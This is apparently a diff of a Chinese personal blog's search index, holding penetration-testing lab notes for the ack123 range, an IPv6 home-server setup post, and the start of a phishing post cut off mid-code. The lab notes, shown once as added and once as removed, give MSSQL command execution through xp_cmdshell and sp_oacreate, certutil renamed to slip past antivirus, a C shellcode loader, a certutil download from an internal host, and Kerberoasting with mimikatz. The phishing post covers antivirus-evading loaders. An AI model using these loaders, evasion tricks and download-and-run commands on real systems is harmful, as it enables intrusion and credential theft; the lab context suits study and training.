+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure>
+<p>执行命令方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
+<p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p>
+<p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p>
+<blockquote>
+<p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p>
+<p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p>
+<p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p>
+</blockquote>
+<p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p>
+<p>首先要开启<code>sp_oacreate</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+<p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+<p>生成cobalt strike 的shellcode加载器</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用Visual Studio编译生成load.exe</p>
+<p>certutil 工具远程下载 loader.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure>
+<p>xp_cmdshell 执行命令加载 shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure>
+<h1 id="kerberosting">kerberosting</h1>
+<p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p>
+<p>流程如下：</p>
+<p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p>
+<p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p>
+<p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p>
+<blockquote>
+<p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p>
+</blockquote>
+<p>首先查询某个域中的SPN信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li>
+<li>-T <a href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li>
+<li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li>
+<li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li>
+</ul>
+</blockquote>
+<p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p>
+<p>在web2中可以看到Administrator注册了一个mysql的SPN</p>
+<p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p>
+<p>接下来使用mimikatz请求SPN的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
+<p>导出当前票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+<p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p>
+<p><a href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p>
+<p><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>后渗透之横向移动</title>
     <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
     <content><![CDATA[<h1 id="环境">环境</h1>
@@ -1580,139 +1721,74 @@ impacket中有smbexec.py工具可以用来攻击<br>
       </tags>
   </entry>
   <entry>
-    <title>暗月ack靶场学习记录</title>
-    <url>/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p>
-<h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1>
-<p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p>
-<p>适用版本：<code>Windows 7、8、10、2008、2012</code></p>
-<p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p>
-<p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p>
-<p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p>
-<p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p>
-<h1 id="MSSQL拿shell">MSSQL拿shell</h1>
-<p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p>
-<p>先判断xp_shell是否存在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
-<p>如果显示0则可以通过以下命令重新加载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure>
-<p>执行命令方法为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
-<p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p>
-<p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p>
-<blockquote>
-<p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p>
-<p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p>
-<p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p>
-</blockquote>
-<p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p>
-<p>首先要开启<code>sp_oacreate</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
-<p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
-<p>生成cobalt strike 的shellcode加载器</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用Visual Studio编译生成load.exe</p>
-<p>certutil 工具远程下载 loader.exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure>
-<p>xp_cmdshell 执行命令加载 shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure>
-<h1 id="kerberosting">kerberosting</h1>
-<p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p>
-<p>流程如下：</p>
-<p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p>
-<p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p>
-<p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p>
-<blockquote>
-<p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p>
-</blockquote>
-<p>首先查询某个域中的SPN信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
-<blockquote>
-<ul>
-<li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li>
-<li>-T <a href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li>
-<li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li>
-<li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li>
-</ul>
-</blockquote>
-<p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p>
-<p>在web2中可以看到Administrator注册了一个mysql的SPN</p>
-<p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p>
-<p>接下来使用mimikatz请求SPN的ST</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
-<p>导出当前票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
-<p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p>
-<p>参考：</p>
-<p><a href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p>
-<p><a href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p>
-<p><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>
+    <title>利用ipv6搭建一台服务器</title>
+    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
+<h3 id="硬件需求">硬件需求</h3>
+<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
+<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
+<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="准备工作">准备工作</h3>
+<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
+<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
+<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>下载balenaetcher将iso文件烧录至U盘中</p>
+<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
+<p>可以以这个up主的视频作为参考</p>
+<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
+<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
+<h3 id="安装系统">安装系统</h3>
+<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
+<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
+<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
+<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
+<h3 id="配置网络">配置网络</h3>
+<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
+<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
+<p>使用以下命令对网卡配置进行修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
+<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
+<h3 id="获取域名">获取域名</h3>
+<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
+<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
+<p>主机记录填写<strong>子域名名称</strong></p>
+<p>记录值填<strong>对应的ipv6地址</strong></p>
+<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
+<p><strong>DDNS</strong></p>
+<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
+<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
+<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
+<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
+<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
+<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>添加定时任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这样ipv6地址就和域名绑定起来了</p>
+<p>到此为止基本的搭建任务就结束了</p>
+<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
+<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
+<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
+<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
+<p>3.取消root登录</p>
+<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
+<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
+<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>经历</category>
       </categories>
       <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>邮箱钓鱼学习</title>
-    <url>/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p><code>邮箱钓鱼</code>是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。</p>
-<h1 id="制作免杀马">制作免杀马</h1>
-<p>邮箱钓鱼攻击的成功与否很大程度上取决于攻击者能否绕过目标系统的防御措施,如杀毒软件、防火墙、沙箱等。因此,学习如何制作免杀的恶意代码是提高邮箱钓鱼攻击效果的关键。</p>
-<p>目前网上有非常多能够帮助shellcode免杀的工具,也可以自己尝试写一写,这里以绕过360为目标</p>
-<p>参考<a href="https://www.freebuf.com/articles/endpoint/323789.html">云山雾隐的shellcode免杀入门文章</a>我们可以得到一个基础的免杀马</p>
-<p>大致原理是对shellcode进行<code>异或加密</code>再<code>base64编码</code>得到密文,然后再对密文进行解码同时加载到内存中,但这种方式同样容易被查杀（2023.6.2测试被杀）,所以我们可以分开写,弄两个文件,一个文件（文件名为.DS_Store）存放我们所加密的shellcode,另外一个可执行文件负责读取shellcode并加载到内存中</p>
-<p>shell.go代码如下：</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span 